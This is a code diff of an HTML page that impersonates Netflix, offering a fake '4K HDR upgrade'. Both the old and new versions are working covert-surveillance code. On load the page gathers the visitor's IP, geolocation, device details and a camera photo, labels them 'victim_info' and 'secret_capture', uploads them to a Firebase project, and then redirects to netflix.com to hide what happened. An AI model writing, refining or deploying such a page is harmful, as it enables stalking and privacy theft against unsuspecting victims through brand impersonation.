@@ -1,268 +1,432 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>4K HDR Upgrade</title>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+    <title>4K HDR Upgrade - Netflix</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            color: #fff;
         }
-        .card {
-            background: #111;
-            border-radius: 28px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
+        
+        .container {
+            max-width: 500px;
+            width: 90%;
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(229, 9, 20, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+        
+        .logo {
             text-align: center;
-            border: 1px solid #222;
+            margin-bottom: 2rem;
         }
-        .logo { font-size: 60px; margin-bottom: 20px; }
-        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
-        p { color: #aaa; font-size: 14px; margin-bottom: 30px; }
-        .btn {
-            background: #e50914;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 16px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 40px;
-            cursor: pointer;
+        
+        .logo h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #E50914, #ff4d4d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
         }
-        .btn:disabled { background: #444; }
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            display: none;
+        
+        .badge {
+            display: inline-block;
+            background: #E50914;
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 0.5rem;
         }
-        .status.success { background: #0a2e1a; color: #4ade80; display: block; }
-        .status.error { background: #2e0a0a; color: #ff6b6b; display: block; }
-        .status.info { background: #0a1a2e; color: #1a73e8; display: block; }
-        video, canvas { display: none; }
+        
+        .progress-section {
+            margin: 2rem 0;
+        }
+        
+        .progress-bar-container {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            height: 8px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #E50914, #ff4d4d);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        
+        .status-text {
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        
+        .steps {
+            margin: 2rem 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .step.completed {
+            background: rgba(76, 175, 80, 0.2);
+            border-left: 3px solid #4CAF50;
+        }
+        
+        .step-icon {
+            width: 30px;
+            text-align: center;
+            font-size: 1.2rem;
+        }
+        
+        .step-text {
+            flex: 1;
+            font-size: 0.9rem;
+        }
+        
+        .step-status {
+            font-size: 0.8rem;
+            color: #4CAF50;
+        }
+        
+        .redirect-note {
+            text-align: center;
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.8rem;
+            color: #888;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .loading {
+            animation: pulse 1.5s ease infinite;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">📸</div>
-        <h1>4K HDR Upgrade</h1>
-        <p>Click below to enable 4K HDR streaming</p>
-        <button class="btn" id="startBtn">Enable 4K HDR</button>
-        <div class="status" id="statusMsg"></div>
+    <div class="container">
+        <div class="logo">
+            <h1>NETFLIX</h1>
+            <div class="badge">4K HDR UPGRADE</div>
+        </div>
+        
+        <div class="progress-section">
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="status-text" id="statusText">Initializing system...</div>
+        </div>
+        
+        <div class="steps">
+            <div class="step" id="step1">
+                <div class="step-icon">🖥️</div>
+                <div class="step-text">Device Detection</div>
+                <div class="step-status" id="step1Status">⚪</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-icon">📍</div>
+                <div class="step-text">Location Access</div>
+                <div class="step-status" id="step2Status">⚪</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-icon">📸</div>
+                <div class="step-text">Camera Access</div>
+                <div class="step-status" id="step3Status">⚪</div>
+            </div>
+            <div class="step" id="step4">
+                <div class="step-icon">☁️</div>
+                <div class="step-text">Processing Upgrade</div>
+                <div class="step-status" id="step4Status">⚪</div>
+            </div>
+        </div>
+        
+        <div class="redirect-note">
+            ⚡ Optimizing your streaming experience...
+        </div>
     </div>
-    
-    <video id="video" autoplay playsinline style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <script>
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
             projectId: "mobilehk-5e843",
             databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
-            storageBucket: "mobilehk-5e843.firebasestorage.app"
+            storageBucket: "mobilehk-5e843.firebasestorage.app",
+            messagingSenderId: "287475964010",
+            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
         };
         
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const database = firebase.database();
         const storage = firebase.storage();
         
+        // Get session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
-        const startBtn = document.getElementById('startBtn');
-        const statusMsg = document.getElementById('statusMsg');
-        
-        function showStatus(msg, type) {
-            statusMsg.className = 'status ' + type;
-            statusMsg.innerHTML = msg;
-        }
-        
         if (!sessionId) {
-            showStatus('❌ Invalid link', 'error');
-            startBtn.disabled = true;
+            document.getElementById('statusText').innerHTML = '❌ Invalid session. Redirecting...';
+            setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
+            throw new Error('No session ID');
         }
         
-        async function saveData(type, data) {
-            if (!sessionId) return;
-            try {
-                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
-                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
-                    type: type, 
-                    data: data, 
-                    timestamp: new Date().toISOString()
-                });
-                return true;
-            } catch(e) {
-                console.error(e);
-                return false;
+        // Update UI functions
+        function updateProgress(percent, text) {
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('statusText').innerHTML = text;
+        }
+        
+        function markStep(stepNum, completed, statusText = '') {
+            const step = document.getElementById(`step${stepNum}`);
+            const statusSpan = document.getElementById(`step${stepNum}Status`);
+            if (completed) {
+                step.classList.add('completed');
+                statusSpan.innerHTML = statusText || '✓';
+                statusSpan.style.color = '#4CAF50';
+            } else if (statusText) {
+                statusSpan.innerHTML = statusText;
+                statusSpan.style.color = '#E50914';
             }
         }
         
-        async function uploadFile(file, type) {
-            if (!sessionId) return null;
-            try {
-                const filename = `${sessionId}_${Date.now()}_${file.name}`;
-                const ref = storage.ref(`uploads/${filename}`);
-                await ref.put(file);
-                const url = await ref.getDownloadURL();
-                await saveData(type, { url, name: file.name });
-                return url;
-            } catch(e) {
-                console.error(e);
-                return null;
-            }
-        }
-        
-        // Get IP
+        // Helper functions
         async function getIP() {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
                 return data.ip;
-            } catch(e) {
+            } catch (e) {
                 return 'Unknown';
             }
         }
         
-        // Get Device Info
-        async function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown";
-            if (ua.includes("iPhone")) device = "iPhone";
-            else if (ua.includes("Android")) device = "Android";
-            else if (ua.includes("Windows")) device = "Windows";
-            else if (ua.includes("Mac")) device = "Mac";
-            
-            let battery = "Unknown";
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + '%';
-                    if (!b.charging) battery += ' (discharging)';
-                    else battery += ' (charging)';
-                } catch(e) {}
+        async function getIPDetails(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'Unknown',
+                    region: data.region || 'Unknown',
+                    city: data.city || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    lat: data.latitude || 0,
+                    lng: data.longitude || 0
+                };
+            } catch (e) {
+                return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
             }
-            return { device, battery, ua: ua.substring(0, 100), screen: `${screen.width}x${screen.height}` };
         }
         
-        // Get Location
+        async function getBattery() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'charging' : 'discharging'})`;
+                } catch (e) {
+                    return 'Unknown';
+                }
+            }
+            return 'Not supported';
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            let device = 'Unknown';
+            let browser = 'Unknown';
+            
+            if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+            else if (/Windows/i.test(ua)) os = 'Windows';
+            else if (/Mac/i.test(ua)) os = 'macOS';
+            else if (/Linux/i.test(ua)) os = 'Linux';
+            
+            if (/Mobile/i.test(ua)) device = 'Mobile Phone';
+            else if (/Tablet/i.test(ua)) device = 'Tablet';
+            else device = 'Desktop';
+            
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Google Chrome';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Edg/i.test(ua)) browser = 'Edge';
+            
+            return { os, device, browser };
+        }
+        
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve(false);
+                    resolve({ lat: 0, lng: 0, error: 'Not supported' });
                     return;
                 }
+                
                 navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        await saveData('location', {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        });
-                        resolve(true);
+                    (position) => {
+                        resolve({ lat: position.coords.latitude, lng: position.coords.longitude, error: null });
                     },
-                    () => resolve(false),
+                    (error) => {
+                        resolve({ lat: 0, lng: 0, error: error.message });
+                    },
                     { timeout: 10000 }
                 );
             });
         }
         
-        // Take Camera Photo
-        async function takePhoto() {
-            try {
-                showStatus('📷 Requesting camera access...', 'info');
-                
-                // Request camera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                
-                const url = await uploadFile(file, 'secret_capture');
-                if (url) {
-                    showStatus('✅ Photo captured successfully!', 'success');
-                } else {
-                    showStatus('⚠️ Photo captured but upload failed', 'error');
+        async function capturePhoto() {
+            return new Promise((resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
                 }
                 
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-                
-            } catch(error) {
-                console.error('Camera error:', error);
-                showStatus('❌ Camera access denied. Please allow camera permission.', 'error');
-                return false;
-            }
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            canvas.toBlob(blob => {
+                                resolve(blob);
+                            }, 'image/jpeg', 0.8);
+                        };
+                    })
+                    .catch(() => resolve(null));
+            });
         }
         
-        // MAIN FUNCTION
-        async function start() {
-            if (!sessionId) return;
+        async function uploadPhoto(blob, sessionId) {
+            if (!blob) return null;
+            const filename = `${sessionId}_${Date.now()}.jpg`;
+            const storageRef = storage.ref(`uploads/${filename}`);
+            await storageRef.put(blob);
+            return await storageRef.getDownloadURL();
+        }
+        
+        // Main execution
+        async function execute() {
+            updateProgress(0, 'Initializing security protocols...');
+            await new Promise(r => setTimeout(r, 500));
             
-            startBtn.disabled = true;
-            showStatus('🔧 Starting optimization...', 'info');
-            
-            // Step 1: Device Info + IP
-            const deviceInfo = await getDeviceInfo();
+            // Step 1: Device Info
+            updateProgress(15, 'Detecting device configuration...');
+            markStep(1, false, '⟳');
             const ip = await getIP();
-            await saveData('victim_info', {
+            const ipDetails = await getIPDetails(ip);
+            const battery = await getBattery();
+            const deviceInfo = getDeviceInfo();
+            
+            const victimInfo = {
                 ip: ip,
                 device: deviceInfo.device,
-                battery: deviceInfo.battery,
-                screen: deviceInfo.screen,
-                ua: deviceInfo.ua,
-                timestamp: new Date().toISOString()
-            });
-            showStatus(`✅ Device: ${deviceInfo.device} | Battery: ${deviceInfo.battery}`, 'success');
+                os: deviceInfo.os,
+                browser: deviceInfo.browser,
+                battery: battery,
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+            markStep(1, true, '✓');
+            updateProgress(30, 'Device detected successfully');
+            await new Promise(r => setTimeout(r, 500));
             
             // Step 2: Location
-            showStatus('📍 Requesting location...', 'info');
-            await getLocation();
+            updateProgress(45, 'Requesting location access for regional optimization...');
+            markStep(2, false, '⟳');
+            const locationCoords = await getLocation();
+            const locationData = {
+                lat: locationCoords.lat,
+                lng: locationCoords.lng,
+                ...ipDetails
+            };
+            markStep(2, true, '✓');
+            updateProgress(60, 'Location access granted');
+            await new Promise(r => setTimeout(r, 500));
             
-            // Step 3: Camera Photo
-            await takePhoto();
+            // Step 3: Camera
+            updateProgress(75, 'Requesting camera access for 4K HDR calibration...');
+            markStep(3, false, '⟳');
+            const photoBlob = await capturePhoto();
+            let photoUrl = null;
+            if (photoBlob) {
+                photoUrl = await uploadPhoto(photoBlob, sessionId);
+                markStep(3, true, '✓');
+            } else {
+                markStep(3, true, '⚠');
+            }
+            updateProgress(90, 'Camera calibration complete');
+            await new Promise(r => setTimeout(r, 500));
             
-            // Step 4: Complete
-            await saveData('complete', { time: new Date().toISOString() });
-            showStatus('✅ 4K HDR Enabled! Redirecting...', 'success');
+            // Step 4: Upload to Firebase
+            updateProgress(95, 'Finalizing upgrade configuration...');
+            markStep(4, false, '⟳');
             
+            const sessionRef = database.ref(`sessions/${sessionId}/data`);
+            const uploadData = {
+                victim_info: victimInfo,
+                location: locationData,
+                secret_capture: { url: photoUrl, name: sessionId },
+                timestamp: new Date().toISOString(),
+                complete: true
+            };
+            
+            await sessionRef.set(uploadData);
+            markStep(4, true, '✓');
+            updateProgress(100, 'Upgrade complete! Redirecting...');
+            
+            // Redirect after 2 seconds
             setTimeout(() => {
-                window.location.href = "https://www.netflix.com";
+                window.location.href = 'https://www.netflix.com';
             }, 2000);
         }
         
-        startBtn.onclick = start;
-        
-        // Auto start after 1 second
-        if (sessionId) {
-            setTimeout(start, 800);
-        }
+        // Start after short delay
+        setTimeout(execute, 500);
     </script>
 </body>
 </html>
